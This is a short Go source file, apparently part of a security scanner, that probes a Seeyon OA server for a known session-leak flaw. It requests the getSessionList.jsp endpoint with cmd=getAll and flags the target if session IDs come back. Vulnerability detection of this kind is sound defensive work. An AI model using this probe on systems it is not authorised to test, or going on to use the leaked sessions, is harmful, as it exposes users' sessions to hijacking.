package seeyon

import (
	"github.com/yhy0/Jie/pkg/protocols/http"
	"strings"
)

//getSessionList.jsp session 泄露

func GetSessionList(u string) bool {
	if req, err := http.Request(u+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "sessionID") {
			return true
		}
	}
	return false
}
